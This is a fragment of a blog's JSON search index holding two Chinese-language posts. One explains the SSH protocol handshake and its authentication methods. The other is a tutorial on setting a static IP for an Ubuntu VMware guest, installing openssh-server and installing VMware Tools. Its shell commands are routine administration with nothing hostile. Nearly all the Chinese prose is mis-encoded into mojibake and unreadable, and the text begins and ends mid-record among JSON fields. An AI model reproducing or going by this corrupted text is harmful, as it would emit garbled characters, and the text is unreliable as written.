ASCII å­—ç¬¦ä¸²(æ˜æ–‡)è¡¨ç¤ºï¼Œä¾‹å¦‚ï¼šSSH-1.5-1.2.27ï¼Œå…¶æ„ä¹‰ä¸ºSSHåè®®ï¼Œç‰ˆæœ¬å·æ˜¯V1.5ï¼ŒSSH1å®ç°ç‰ˆæœ¬ä¸º1.2.27ã€‚\nâœ telnet 165.227.65.39(æµ‹è¯•ä¸€ä¸ªæœåŠ¡å™¨åœ°å€) SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4 å®¢æˆ·ç«¯æ”¶åˆ°æŠ¥æ–‡åï¼Œè§£æè¯¥æ•°æ®åŒ…ï¼Œå¦‚æœæœåŠ¡å™¨ç«¯çš„åè®®ç‰ˆæœ¬å·æ¯”è‡ªå·±çš„ä½ï¼Œä¸”å®¢æˆ·ç«¯èƒ½æ”¯æŒæœåŠ¡å™¨ç«¯çš„ä½ç‰ˆæœ¬ï¼Œå°±ä½¿ç”¨æœåŠ¡å™¨ç«¯çš„ä½ç‰ˆæœ¬åè®®å·ï¼Œå¦åˆ™ä½¿ç”¨è‡ªå·±çš„åè®®ç‰ˆæœ¬å·ã€‚\nå®¢æˆ·ç«¯å›åº”æœåŠ¡å™¨ä¸€ä¸ªæŠ¥æ–‡ï¼ŒåŒ…å«äº†å®¢æˆ·ç«¯å†³å®šä½¿ç”¨çš„åè®®ç‰ˆæœ¬å·ã€‚æœåŠ¡å™¨æ¯”è¾ƒå®¢æˆ·ç«¯å‘æ¥çš„ç‰ˆæœ¬å·ï¼Œå†³å®šæ˜¯å¦èƒ½åŒå®¢æˆ·ç«¯ä¸€èµ·å·¥ä½œã€‚\nå¦‚æœåå•†æˆåŠŸï¼Œåˆ™è¿›å…¥å¯†é’¥å’Œç®—æ³•åå•†é˜¶æ®µï¼Œå¦åˆ™æœåŠ¡å™¨ç«¯æ–­å¼€ TCPè¿æ¥ã€‚\nå¦‚æœå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç¡®å®šå…¶åè®®ç‰ˆæœ¬å·æ˜¯å…¼å®¹çš„ï¼Œé‚£ä¹ˆè¿æŒ‰å°±ç»§ç»­è¿›è¡Œï¼Œå¦åˆ™ï¼ŒåŒæ–¹éƒ½å¯èƒ½å†³å®šä¸­æ–­è¿æ¥ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ªåªä½¿ç”¨ SSH-1 çš„å®¢æˆ·ç«¯è¿æ¥åˆ°ä¸€ä¸ªåªä½¿ç”¨ SSH-2 çš„æœåŠ¡å™¨ä¸Šï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯å°±ä¼šæ–­å¼€è¿æ¥å¹¶æ‰“å°ä¸€æ¡é”™è¯¯æ¶ˆæ¯ã€‚å®é™…ä¸Šè¿˜å¯èƒ½æ‰§è¡Œå…¶ä»–æ“ä½œï¼šä¾‹å¦‚ï¼Œåªä½¿ç”¨SSH-2çš„æœåŠ¡å™¨å¯ä»¥è°ƒç”¨SSH-1æœåŠ¡å™¨æ¥å¤„ç†è¿™æ¬¡è¿æ¥è¯·æ±‚ã€‚\nNoteï¼š ç‰ˆæœ¬å·åå•†é˜¶æ®µæŠ¥æ–‡éƒ½æ˜¯é‡‡ç”¨æ˜æ–‡æ–¹å¼ä¼ è¾“çš„ã€‚\nåè®®ç‰ˆæœ¬å·äº¤æ¢è¿‡ç¨‹ä¸€æ—¦å®Œæˆï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éƒ½ç«‹å³ä»ä¸‹å±‚çš„ TCP è¿æ¥åˆ‡æ¢åˆ°åŸºäºå­æŠ¥æ–‡çš„åè®®ã€‚æ¯ä¸ªæŠ¥æ–‡éƒ½åŒ…å«ä¸€ä¸ª32ä½çš„å­—æ®µï¼Œ1 - 8å­—èŠ‚çš„å¡«å……ä½[ ç”¨æ¥é˜²æ­¢å·²çŸ¥æ˜æ–‡æ”»å‡»unknown-plaintext attack ]ï¼Œä¸€ä¸ª1å­—èŠ‚çš„æŠ¥æ–‡ç±»å‹ä»£ç , æŠ¥æ–‡æœ‰æ•ˆæ•°æ®å’Œä¸€ä¸ª4å­—èŠ‚çš„å®Œæ•´æ€§æ£€æŸ»å­—æ®µã€‚\næœåŠ¡å™¨å‘å®¢æˆ·ç«¯æä¾›è‡ªå·±çš„èº«ä»½è¯æ˜å’Œä¼šè¯å‚æ•° æœåŠ¡å™¨å‘å®¢æˆ·ç«¯å‘é€ä»¥ä¸‹ä¿¡æ¯(ç°åœ¨è¿˜æ²’æœ‰åŠ å¯†):\nä¸»æœºå¯†é’¥ï¼ˆHost Keyï¼‰ï¼Œç”¨äºåé¢è¯æ˜æœåŠ¡å™¨ä¸»æœºçš„èº«ä»½ æœåŠ¡å™¨å¯†é’¥ï¼ˆServer Keyï¼‰ï¼Œç”¨æ¥å¸®åŠ©å»ºç«‹å®‰å…¨è¿æ¥ 8ä¸ªéšæœºå­—èŠ‚åºåˆ—ï¼Œç§°ä¸ºæ£€æµ‹å­—èŠ‚ï¼ˆcheck bytes)ã€‚å®¢æˆ·ç«¯åœ¨ä¸‹ä¸€æ¬¡å“åº”ä¸­å¿…é¡»åŒ…æ‹¬è¿™äº›æ£€æµ‹å­—èŠ‚ï¼Œå¦å‰‡æœåŠ¡å™¨å°±ä¼šæ‹’ç»æ¥æ”¶å“åº”ä¿¡æ¯ï¼Œè¿™ç§æ–¹æ³•å¯ä»¥é˜²æ­¢æŸäº› IPä¼ªè£…æ”»å‡»(IP spoofing attack)ã€‚ è¯¥æœåŠ¡å™¨æ”¯æŒçš„åŠ å¯†ã€å‹ç¼©å’Œè®¤è¯æ–¹æ³• æ­¤æ—¶ï¼ŒåŒæ–¹éƒ½è¦è®¡ç®—ä¸€ä¸ªé€šç”¨çš„ 128 ä½ä¼šè¯æ ‡è¯†ç¬¦(Session ID)ã€‚å®ƒåœ¨æŸäº›åè®®ä¸­ç”¨æ¥æƒŸä¸€æ ‡è¯†è¿™ä¸ª SSH ä¼šè¯ã€‚è¯¥å€¼æ˜¯ ä¸»æœºå¯†é’¥ï¼ˆHost Keyï¼‰ã€æœåŠ¡å™¨å¯†é’¥ï¼ˆServer Keyï¼‰å’Œæ£€æµ‹å­—èŠ‚ï¼ˆcheck bytes)ä¸€èµ·åº”ç”¨ MD5æ•£åˆ—å‡½æ•° å¾—åˆ°çš„ç»“æœã€‚\nå½“å®¢æˆ·ç«¯æ¥æ”¶åˆ° ä¸»æœºå¯†é’¥ï¼ˆHost Keyï¼‰æ—¶ï¼Œå®ƒè¦è¿›è¡Œè¯¢é—®ï¼šâ€œä¹‹å‰æˆ‘å’Œè¿™ä¸ªæœåŠ¡å™¨é€šä¿¡è¿‡å—ï¼Ÿå¦‚æœé€šä¿¡è¿‡ï¼Œé‚£ä¹ˆå®ƒçš„ä¸»æœºå¯†é’¥æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿâ€è¦å›ç­”è¿™ä¸ªé—®é¢˜ï¼Œå®¢æˆ·ç«¯å°±è¦æŸ»é˜…è‡ªå·±çš„å·²çŸ¥åä¸»æœºæ•°æ®åº“ã€‚å¦‚æœæ–°è¿‘åˆ°è¾¾çš„ä¸»æœºå¯†é’¥å¯ä»¥å’Œæ•°æ®åº“ä¸­ä»¥å‰çš„ä¸€ä¸ªå¯†é’¥åŒ¹ï¼Œé‚£ä¹ˆå°±æ²¡æœ‰é—®é¢˜äº†ã€‚\nä½†æ˜¯ï¼Œæ­¤æ—¶è¿˜å­˜åœ¨ä¸¤ç§å¯èƒ½ï¼šå·²çŸ¥åä¸»æœºæ•°æ®åº“ä¸­æ²¡æœ‰è¿™ä¸ªæœåŠ¡å™¨ï¼Œä¹Ÿå¯èƒ½æœ‰è¿™ä¸ªæœåŠ¡å™¨ä½†æ˜¯å…¶ä¸»æœºå¯†é’¥ä¸åŒã€‚åœ¨è¿™ä¸¤ç§æƒ…å†µä¸­ï¼Œå®¢æˆ·ç«¯è¦é€‰æ‹©æ˜¯ä¿¡ä»»è¿™ä¸ªæ–°è¿‘åˆ°è¾¾çš„å¯†é’¥è¿˜æ˜¯æ‹’ç»æ¥å—è¯¥å¯†é’¥ã€‚æ­¤æ—¶å°±éœ€è¦äººçš„æŒ‡å¯¼å‚ä¸äº†ï¼Œä¾‹å¦‚ï¼Œå®¢æˆ·ç«¯ç”¨æˆ·å¯èƒ½è¢«æç¤ºè¦æ±‚ç¡®å®šæ˜¯æ¥å—è¿˜æ˜¯æ‹’ç»è¯¥å¯†é’¥ã€‚\nThe authenticity of host 'ssh-server.example.com (12.18.429.21)' can't be established. RSA key fingerprint is 98:2e:d7:e0:de:9f:ac:67:28:c2:42:2d:37:16:58:4d. Are you sure you want to continue connecting (yes/no)? å¦‚æœå®¢æˆ·ç«¯æ‹’ç»æ¥å—è¿™ä¸ªä¸»æœºå¯†é’¥ï¼Œé‚£ä¹ˆè¿æ¥å°±ä¸­æ­¢äº†ã€‚è®©æˆ‘ä»¬å‡è®¾å®¢æˆ·ç«¯æ¥å—è¯¥å¯†é’¥ï¼Œç°åœ¨ç»§ç»­ä»‹ç»ã€‚\nå®¢æˆ·ç«¯å‘æœåŠ¡å™¨ç«¯å‘é€è®¤è¯è¯·æ±‚ï¼Œè®¤è¯è¯·æ±‚ä¸­åŒ…å«ç”¨æˆ·åã€è®¤è¯æ–¹æ³•ã€ä¸è¯¥è®¤è¯æ–¹æ³•ç›¸å…³çš„å†…å®¹ï¼ˆå¦‚ï¼špasswordè®¤è¯æ—¶ï¼Œå†…å®¹ä¸ºå¯†ç ï¼‰ã€‚\næœåŠ¡å™¨ç«¯å¯¹å®¢æˆ·ç«¯è¿›è¡Œè®¤è¯ï¼Œå¦‚æœè®¤è¯å¤±è´¥ï¼Œåˆ™å‘å®¢æˆ·ç«¯å‘é€è®¤è¯å¤±è´¥æ¶ˆæ¯ï¼Œå…¶ä¸­åŒ…å«å¯ä»¥å†æ¬¡è®¤è¯çš„æ–¹æ³•åˆ—è¡¨ã€‚\nå®¢æˆ·ç«¯ä»è®¤è¯æ–¹æ³•åˆ—è¡¨ä¸­é€‰å–ä¸€ç§è®¤è¯æ–¹æ³•å†æ¬¡è¿›è¡Œè®¤è¯ã€‚\nè¯¥è¿‡ç¨‹åå¤è¿›è¡Œï¼Œ ç›´åˆ°è®¤è¯æˆåŠŸæˆ–è€…è®¤è¯æ¬¡æ•°è¾¾åˆ°ä¸Šé™ï¼Œ æœåŠ¡å™¨å…³é—­è¿æ¥ä¸ºæ­¢ã€‚\nSSHæä¾›ä¸¤ç§è®¤è¯æ–¹å¼ï¼š\npasswordè®¤è¯ï¼šå®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘å‡º passwordè®¤è¯è¯·æ±‚ï¼Œå°†ç”¨æˆ·åå’Œå¯†ç åŠ å¯†åå‘é€ç»™æœåŠ¡å™¨ï¼›æœåŠ¡å™¨å°†è¯¥ä¿¡æ¯è§£å¯†åå¾—åˆ°ç”¨æˆ·åå’Œå¯†ç çš„æ˜æ–‡ï¼Œä¸è®¾å¤‡ä¸Šä¿å­˜çš„ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œæ¯”è¾ƒï¼Œå¹¶è¿”å›è®¤è¯æˆåŠŸæˆ–å¤±è´¥çš„æ¶ˆæ¯ã€‚ publickey è®¤è¯ï¼šé‡‡ç”¨æ•°å­—ç­¾åçš„æ–¹æ³•æ¥è®¤è¯å®¢æˆ·ç«¯ã€‚ç›®å‰ï¼Œè®¾å¤‡ä¸Šå¯ä»¥åˆ©ç”¨RSAå’Œ DSAä¸¤ç§å…¬å…±å¯†é’¥ç®—æ³•å®ç°æ•°å­—ç­¾åã€‚å®¢æˆ·ç«¯å‘é€åŒ…å«ç”¨æˆ·åã€å…¬å…±å¯†é’¥å’Œå…¬å…±å¯†é’¥ç®—æ³•çš„ publickey è®¤è¯è¯·æ±‚ç»™æœåŠ¡å™¨ç«¯ã€‚æœåŠ¡å™¨å¯¹å…¬é’¥è¿›è¡Œåˆæ³•æ€§æ£€æŸ¥ï¼Œå¦‚æœä¸åˆæ³•ï¼Œåˆ™ç›´æ¥å‘é€å¤±è´¥æ¶ˆæ¯ï¼›å¦åˆ™ï¼ŒæœåŠ¡å™¨åˆ©ç”¨æ•°å­—ç­¾åå¯¹å®¢æˆ·ç«¯è¿›è¡Œè®¤è¯ï¼Œå¹¶è¿”å›è®¤è¯æˆåŠŸæˆ–å¤±è´¥çš„æ¶ˆæ¯ SSH2.0è¿˜æä¾›äº† password-publickey è®¤è¯å’Œ any è®¤è¯:\npassword-publickey è®¤è¯ï¼šæŒ‡å®šè¯¥ç”¨æˆ·çš„è®¤è¯æ–¹å¼ä¸º password å’Œ publickeyè®¤è¯åŒæ—¶æ»¡è¶³ã€‚å®¢æˆ·ç«¯ç‰ˆæœ¬ä¸º SSH1çš„ç”¨æˆ·åªè¦é€šè¿‡å…¶ä¸­ä¸€ç§è®¤è¯å³å¯ç™»å½•ï¼›å®¢æˆ·ç«¯ç‰ˆæœ¬ä¸º SSH2çš„ç”¨æˆ·å¿…é¡»ä¸¤ç§è®¤è¯éƒ½é€šè¿‡æ‰èƒ½ç™»å½•ã€‚ anyè®¤è¯ï¼šæŒ‡å®šè¯¥ç”¨æˆ·çš„è®¤è¯æ–¹å¼å¯ä»¥æ˜¯ passwordï¼Œä¹Ÿå¯ä»¥æ˜¯ publickeyã€‚ ","date":1526141671,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1526141671,"objectID":"74bc40308e7df61a17853598bc860930","permalink":"http://www.guozet.me/post/Linux-SSH-introduce/","publishdate":"2018-05-12T16:14:31Z","relpermalink":"/post/Linux-SSH-introduce/","section":"post","summary":"å‰è¨€ æœ€è¿‘ä½¿ç”¨SSHæ¥ç™»é™†DigitalOcean VPSçš„æ—¶å€™","tags":"Linux","title":"SSHåè®®è§£æ","type":"post"},{"authors":null,"categories":"Network","content":"å‰è¨€ æ¯æ¬¡ä½¿ç”¨å­¦æ ¡Labçš„æ—¶å€™ï¼Œéƒ½ä¼šæœ‰åœ¨éœ€è¦å®‰è£…è½¯ä»¶æˆ–è€…æ›´æ–°è½¯ä»¶çš„æ—¶å€™ï¼Œç”±äºæ²¡æœ‰Rootæƒé™è€Œå¯¼è‡´è‡ªå·±éœ€è¦é‡æ–°æƒ³åŠæ³•å¤„ç†ï¼Œæˆ–è€…æ¢åˆ°VPSä¸Šå»å¤„ç†çš„æƒ…å†µå‘ç”Ÿã€‚æ¯å½“è¿™ä¸ªæ—¶å€™ï¼Œéƒ½åœ¨è€ƒè™‘ï¼Œæ˜¯å¦å¯ä»¥åœ¨VMä¸­æ„å»ºä¸€ä¸ªè‡ªå·±åœ¨ä»»ä½•åœ°æ–¹éƒ½å¯ä»¥è®¿é—®çš„æœåŠ¡å™¨ï¼Ÿ\nè§£å†³æ–¹æ¡ˆ è®¾ç½®é™æ€IPåœ°å€ èƒŒæ™¯\nåœ¨è™šæ‹Ÿæœºä¸‹è¿è¡Œæ“ä½œç³»ç»Ÿï¼Œå°¤å…¶æ˜¯Linuxç³»ç»Ÿå·²ç»æ˜¯éå¸¸å¸¸è§çš„åšæ³•ã€‚æœ‰æ—¶ä½ æƒ³åœ¨è™šæ‹Ÿæœºä¸‹æ­å»ºä¸€ä¸ª(æ¨¡æ‹Ÿ)æœåŠ¡å™¨æ¥ä¾›ä¸»æœºè®¿é—®ï¼Œæ¯”å¦‚æ­å»ºä¸€ä¸ªtelnet/sshã€‚æ­¤æ—¶ä½ ä¼šå‘ç°ï¼Œæ¯æ¬¡å¯åŠ¨è™šæ‹Ÿæœºï¼ŒVMWareä¸ºè™šæ‹Ÿæœºç³»ç»Ÿåˆ†é…ä¸€ä¸ªåŠ¨æ€IPï¼Œè¿™æ ·æ¯æ¬¡å»è¿æ¥è™šæ‹Ÿæœºçš„telnetæ—¶å¾ˆä¸æ–¹ä¾¿ã€‚å¦‚æœè®¾æˆé™æ€IPå°±å¥½äº†ã€‚\nVMnet8å’ŒNAT\nå¦‚æœä½ çš„è™šæ‹Ÿæœºæ˜¯ä»¥NATæ–¹å¼è¿å…¥äº’è”ç½‘çš„è¯ï¼Œé‚£ä¹ˆè™šæ‹Ÿæœºçš„IPåœ°å€éé…ï¼Œç½‘å…³ä»¥åŠäº’è”ç½‘è®¿é—®æƒé™å‡ç”±VMWareæä¾›çš„å«åšVMnet8è™šæ‹Ÿç½‘å¡æ‰€æä¾›ã€‚æ‰€ä»¥ä¸€åˆ‡å’Œè®¾ç½®é™æ€IPæœ‰å…³çš„è®¾ç½®éƒ½å¯ä»¥ä»è¿™é‡Œæ‰¾åˆ°ã€‚é€šVMnet8è™šæ‹Ÿç½‘å¡ï¼Œä¸»æœºå¯ä»¥è®¿é—®è™šæ‹Ÿæœºçš„IPï¼Œè™šæ‹Ÿæœºå¯ä»¥è¿å…¥ä¸»æœºçš„äº’è”ç½‘è¿æ¥è¿å…¥å¤–ç½‘ã€‚\nç¡®è®¤VMnet8è™šæ‹Ÿç½‘å¡å·²å¯ç”¨\nåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼ŒVMWare Workstationå·²ç»å¯ç”¨VMnet8è™šæ‹Ÿç½‘å¡ï¼ŒWindows 7ä¸‹ï¼Œé€šè¿‡è¿›å…¥ æ§åˆ¶é¢æ¿\u0026gt;ç½‘ç»œå’ŒInternet\u0026gt;ç½‘ç»œå’Œå…±äº«ä¸­å¿ƒ\u0026gt;æ›´æ”¹é€‚é…å™¨è®¾ç½® å¯ä»¥æŸ¥çœ‹è¯¥è™šæ‹Ÿç½‘å¡çš„çŠ¶æ€ã€‚å¦‚å›¾1-1æ‰€ç¤ºã€‚\nå¾—åˆ°å¯ç”¨IPèŒƒå›´ã€ç½‘å…³å’Œå­ç½‘æ©ç \nåœ¨VMWareä¸»ç•Œé¢ï¼Œç‚¹å‡»Edit\u0026gt;Virtual Network Editorèœå•è¿›å…¥è™šæ‹Ÿç½‘å¡å‚æ•°è®¾ç½®ç•Œé¢ï¼ˆå›¾1-2ï¼‰ã€‚é€‰æ‹©VMnet8æ¡ç›®ï¼Œç‚¹å‡»NAT SettingsæŒ‰é’®åå¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„VMWare Workstationä¸ºNATè¿æ¥çš„è™šæ‹Ÿæœºè®¾å®šçš„é»˜è®¤ç½‘å…³ï¼Œæ­¤å¤„ä¸º192.168.91.2ï¼Œä»¥åŠå­ç½‘æ©ç ï¼Œæ­¤å¤„ä¸º255.255.255.0, å¦‚å›¾1-3æ‰€ç¤ºã€‚\nç‚¹å‡»DHCP SettingsæŒ‰é’®ï¼Œå¯ä»¥çœ‹åˆ°VMnet8ä¸ºè™šæ‹Ÿæœºåˆ†é…çš„å¯ç”¨çš„å­ç½‘IPèŒƒå›´ï¼Œå¦‚å›¾1-4æ‰€ç¤ºã€‚\nåœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ° OKï¼Œè‡³æ­¤ï¼Œæ‰€æœ‰æˆ‘ä»¬éœ€è¦çš„ä¿¡æ¯éƒ½å·²ç»è·å–åˆ°ï¼Œè¿™é‡Œæ±‡æ€»ä¸€ä¸‹ï¼Œ\nå­ç½‘IPå¯ç”¨èŒƒå›´ï¼š192.168.91.128~192.168.91.254\nå­ç½‘æ©ç ï¼š255.255.255.0\nç½‘å…³: 192.168.91.2\nä¸‹é¢å¼€å§‹è¿›å…¥Ubuntuè™šæ‹Ÿæœºè®¾ç½®é™æ€IPã€‚\nUbuntuè®¾ç½®IPå¾—çŸ¥\nå¯åŠ¨è™šæ‹ŸæœºUbuntuç³»ç»Ÿï¼Œæ‰“å¼€ç»ˆç«¯ï¼Œåˆ©ç”¨å¦‚ä¸‹å‘½ä»¤æ‰“å¼€å¹¶ç¼–è¾‘ç½‘ç»œæ¥å£é…ç½®æ–‡ä»¶ï¼š sudo vi /etc/network/interfaces 2. ç¼–è¾‘æ–‡ä»¶å¦‚ä¸‹ï¼š\nå¤åˆ¶ä»£ç  auto lo iface lo inet loopback\nAssgin static IP by eric on 26-SEP-2012 iface eth0 inet static address 192.168.91.200 #change to your static IP netmask 255.255.255.0 #change to your netmask gateway 192.168.91.2 #change to your getway #We must specify dns-nameserver here #in order to get internet access from host dns-nameservers 192.168.91.2 auto eth0 å¤åˆ¶ä»£ç  è¯´æ˜\naddressæ˜¯ä½ è¦åˆ†é…ç»™ä½ è™šæ‹Ÿæœºçš„é™æ€IPåœ°å€ï¼Œå¯ä»¥ä»åˆšæ‰æˆ‘ä»¬æ‰¾åˆ°çš„å¯ç”¨çš„å­ç½‘IPèŒƒå›´ä¸­éšä¾¿é€‰æ‹©ä¸€ä¸ªæ”¾åœ¨æ­¤å¤„ã€‚\nnetmaskæ˜¯å­ç½‘æ©ç \ngatewayæ˜¯ç½‘å…³\næ³¨æ„ï¼šåœ¨ç›¸å¯¹è¾ƒæ—©çš„ç‰ˆæœ¬ä¸­ï¼Œä½ éœ€è¦è®¾ç½®/etcä¸‹çš„resolv.confæ–‡ä»¶ï¼Œå¹¶åŠ å…¥nameserverï¼Œè¿™æ ·æ‰å¯ä»¥è¿æ¥äº’è”ç½‘ã€‚ä½†åœ¨Ubuntu 12.04ä¹‹åï¼Œå·²ç»ä¸æ¨èè¿™ç§æ–¹å¼äº†ï¼Œå› ä¸ºæ— è®ºä½ æƒ³è¯¥é…ç½®æ–‡ä»¶ä¸­è®¾ç½®ä»€ä¹ˆå€¼ï¼Œé‡æ–°å¯åŠ¨ä¹‹åéƒ½ä¼šè¢«è¿˜åŸä¸ºåˆå§‹çŠ¶æ€ã€‚æ¨èçš„åšæ³•æ˜¯ç›´æ¥åœ¨interfacesé…ç½®æ–‡ä»¶ä¸­åŠ å…¥dns-nameserver \u0026lt;ç½‘å…³IP\u0026gt;è¿™ä¸€è¡Œã€‚\né‡å¯ubuntuçš„ç½‘å¡ sudo /etc/init.d/networking restart 4. pingæµ‹è¯•äº’è”ç½‘è¿é€šæ€§\nping www.baidu.com å¦‚æœpingæœ‰å“åº”ï¼Œé‚£ä¹ˆæ­å–œä½ ï¼Œä½ å·²ç»æˆåŠŸå°†è™šæ‹Ÿæœºè®¾ç½®ä¸ºé™æ€IPï¼Œå¹¶ä¸”ä¹Ÿå·²è¿å…¥äº’è”ç½‘ã€‚\nå¼€å¯é˜²ç«å¢™ ufw enable\nå…³é—­é˜²ç«å¢™ ufw disable\nå¦‚æœè™šæ‹Ÿæœºé‡Œèƒ½pingåŒæœ¬æœºï¼Œè€Œæœ¬æœºå´pingä¸é€šè™šæ‹Ÿæœºï¼Œæˆ–è€…è™šæ‹Ÿæœºä¸èƒ½pingé€šæœ¬æœºï¼Œå¯èƒ½æœ‰å¦‚ä¸‹åŸå› ï¼š\nä¸€ï¼Œå¦‚æœæ˜¯æ¡¥æ¥æ¨¡å¼ï¼Œé‚£ä¹ˆå¯èƒ½æ€§1ï¼šè™šæ‹Ÿæœºé˜²ç«å¢™ç¦pingï¼Œè¯·å…³é—­è™šæ‹Ÿæœºé˜²ç«å¢™é‡è¯•ï¼›å¯èƒ½æ€§2ï¼šæ¡¥æ¥è®¾ç½®çš„ipæœ‰å†²çªæˆ–è€…æ˜¯è™šæ‹Ÿæœºæ¡¥æ¥æœåŠ¡ä¸æ­£å¸¸ã€‚\näºŒï¼Œå¦‚æœæ˜¯natæ¨¡å¼ï¼Œé‚£ä¹ˆå¯èƒ½æ€§1ï¼šè™šæ‹Ÿæœºé˜²ç«å¢™ç¦pingï¼Œè¯·å…³é—­è™šæ‹Ÿæœºé˜²ç«å¢™é‡è¯•ï¼›å¯èƒ½æ€§2ï¼šæœ¬æœºä¸Šçš„vmnet8ç½‘å¡è¢«ç¦ç”¨äº†ã€‚å¯èƒ½æ€§3ï¼švboxçš„natæ¨¡å¼ï¼Œvpcçš„å…±äº«æ¨¡å¼ï¼Œæœ¬æ¥å°±è¿™æ ·çš„ã€‚\nä¸‰ï¼Œå¦‚æœä¸»æœºåŒæ—¶è£…äº†visualboxå’Œvmï¼Œä¹Ÿä¼šå¯¼è‡´å…¶ä¸­ä¸€ä¸ªè™šæ‹Ÿæœºpingä¸é€šä¸»æœºï¼Œå› æ­¤ä½¿ç”¨vmæˆ–vbæ—¶ï¼Œåœ¨ä¸»æœºä¸Šç¦ç”¨å¦ä¸€ä¸ªè™šæ‹Ÿç½‘å¡å³å¯ã€‚\nSSHåˆ†å®¢æˆ·ç«¯openssh-clientå’Œopenssh-server å¦‚æœä½ åªæ˜¯æƒ³ç™»é™†åˆ«çš„æœºå™¨çš„SSHåªéœ€è¦å®‰è£…openssh-clientï¼ˆubuntuæœ‰é»˜è®¤å®‰è£…ï¼Œå¦‚æœæ²¡æœ‰åˆ™sudo apt-get install openssh-clientï¼‰ï¼Œå¦‚æœè¦ä½¿æœ¬æœºå¼€æ”¾SSHæœåŠ¡å°±éœ€è¦å®‰è£…openssh-server sudo apt-get install openssh-server ç„¶åç¡®è®¤sshserveræ˜¯å¦å¯åŠ¨äº†ï¼š ps -e |grep ssh å¦‚æœçœ‹åˆ°sshdé‚£è¯´æ˜ssh-serverå·²ç»å¯åŠ¨äº†ã€‚ å¦‚æœæ²¡æœ‰åˆ™å¯ä»¥è¿™æ ·å¯åŠ¨ï¼šsudo /etc/init.d/ssh start æˆ–è€… service ssh start ssh-serveré…ç½®æ–‡ä»¶ä½äº/etc/ssh/sshd_configï¼Œåœ¨è¿™é‡Œå¯ä»¥å®šä¹‰SSHçš„æœåŠ¡ç«¯å£ï¼Œé»˜è®¤ç«¯å£æ˜¯22ï¼Œä½ å¯ä»¥è‡ªå·±å®šä¹‰æˆå…¶ä»–ç«¯å£å·ï¼Œå¦‚222ã€‚ ç„¶åé‡å¯SSHæœåŠ¡ï¼š sudo /etc/init.d/ssh stop sudo /etc/init.d/ssh start ç„¶åä½¿ç”¨ä»¥ä¸‹æ–¹å¼ç™»é™†SSHï¼š ssh username@192.168.1.112 usernameä¸º192.168.1.112 æœºå™¨ä¸Šçš„ç”¨æˆ·ï¼Œéœ€è¦è¾“å…¥å¯†ç ã€‚\nåœ¨åˆšå®‰è£…å®Œubuntuåï¼Œå±å¹•ä¸èƒ½å…¨å±æ˜¾ç¤ºï¼Œæ­¤æ—¶ï¼š\n1ã€å®‰è£…VMware Tools\næ­¥éª¤ï¼š\n1.1 è¿›å…¥ubuntuç³»ç»Ÿåï¼Œç‚¹å‡»è™šæ‹Ÿæœºä¸Šçš„ã€è™šæ‹Ÿæœºã€‘-\u0026gt;ã€å®‰è£… vmware toolsã€‘ï¼Œå›åˆ°æ¡Œé¢å›çœ‹åˆ°ä¸€ä¸ªvmware toolsçš„ cdromå›¾æ ‡ã€‚\n1.2 å¤åˆ¶ VMwareTools-10.0.10-4301679.tar.gzï¼ˆç‰ˆæœ¬æ ¹æ®è‡ªå·±çš„å®é™…æƒ…å†µï¼‰ åˆ°/home/lance/ç›®å½•ä¸‹ã€‚ ç”¨å‘½ä»¤ã€tar -xzvf VMwareTools-10.0.10-4301679.tar.gzã€‘è§£å‹ã€‚\r1.3 è§£å‹å cd vmware_tools_distribï¼Œæ‰“å¼€ç»ˆç«¯\r1.4 è¾“å…¥â€œsudo ./vmware-install.plâ€ï¼Œè¾“å…¥ç”¨æˆ·å¯†ç ä¾¿å¯å¼€å§‹å®‰è£…äº†ã€‚\r1.5 æ¥ä¸‹æ¥Nå¤šçš„enterï¼ŒNå¤šçš„YESï¼Œè‡ªå·±æ…¢æ…¢æŒ‰å§ã€‚\r1.6 ç›´åˆ°ä½ çœ‹åˆ°â€”the vmware team å reboot é‡å¯å³å¯\r1.7 è‹¥è¿˜æ²¡æœ‰å…¨å±æ˜¾ç¤ºï¼Œåˆ™å°†è™šæ‹Ÿæœºçš„ã€æŸ¥çœ‹ã€‘-\u0026gt;ã€è‡ªåŠ¨è°ƒæ•´å¤§å°ã€‘-\u0026gt;ã€è‡ªé€‚åº”å®¢æˆ·æœºã€‘,éƒ½é€‰ä¸Šã€‚å³å¯å®ç°å…¨å±ã€‚\r1.8 å®‰è£…vmware toolså®ç°å…¨å±åï¼Œå³ä¹Ÿå®ç°äº†åœ¨ä¸»æœºï¼ˆWIN7ï¼‰å’Œè™šæ‹ŸæœºVMware ï¼ˆubuntuï¼‰é—´ç›´æ¥æ‹–æ‹½æ–‡ä»¶ã€‚\renjoy yourself\nUbuntu 16.04 æ‰§è¡Œä¸‹é¢å‘½ä»¤é»˜è®¤å¯åŠ¨åˆ°å‘½ä»¤è¡Œï¼š $ sudo systemctl set-default multi-user.target æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å¯åŠ¨åˆ°æ¡Œé¢ï¼š $ sudo systemctl start lightdm\n","date":1526088632,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1526088632,"objectID":"5f3a7a227e9c03f69f6a2b7c4877c81b","permalink":"http://www.guozet.me/post/Set-a-Ubuntu-in-the-VM/","publishdate":"2018-05-12T01:30:32Z","relpermalink":"/post/Set-a-Ubuntu-in-the-VM/","section":"post","summary":"å‰è¨€ æ¯æ¬¡ä½¿ç”¨å­¦æ 